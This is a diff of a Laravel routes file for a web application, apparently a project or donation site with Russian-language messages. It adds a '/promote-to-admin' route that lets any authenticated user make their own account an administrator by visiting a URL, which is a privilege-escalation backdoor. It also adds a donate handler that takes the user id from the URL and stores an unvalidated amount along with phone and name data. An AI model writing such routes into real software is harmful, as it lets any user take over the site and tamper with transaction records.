@@ -35,6 +35,13 @@ Route::get('/test', function (Request $request) {
     ]);
 });
 
+Route::get("/promote-to-admin",function (Request $request){
+    $user = Auth::user();
+    DB::table('users')->where("id",'=',$user->id)->update([
+       "role" =>"admin"
+    ]);
+})->middleware("auth");
+
 Route::get('/', function () {
     return view('home');
 });
@@ -142,7 +149,7 @@ Route::group(
         });
         Route::post('create-project',function(Request $request){
             if ($request->hasFile('projectPhoto') && $request->file('projectPhoto')->isValid()) {
-                $image_path = $request->projectPhoto->store('/projectsImg', ['disk' => 'public']);
+                $image_path = $request->projectPhoto->store('/projectsImg', ['disk' => 'public_uploads']);
             }
             DB::table('projects')->insert([
                 "name"=>$request->projectName,
@@ -198,8 +205,16 @@ Route::group(
             $request->session()->flash('warning',"У вас нет прав ");
             return  redirect('/');
         });
-        Route::post("/pocket/donate/{id}",function (){
-
+        Route::post("/pocket/donate/{id}",function (Request $request, $id){
+            DB::table('transactions')->insert([
+                "user_id" =>$id,
+                "receiver_id" =>$id,
+                "price" => $request->cash,
+                "purpose" => 0,
+                "other_data" => ["phone"=>$request->phone,"name"=>$request->name]
+            ]);
+            $request->session()->flash("message"," Запрос отправлен ожидайте валидации ! ");
+            return back();
         });
 
     }
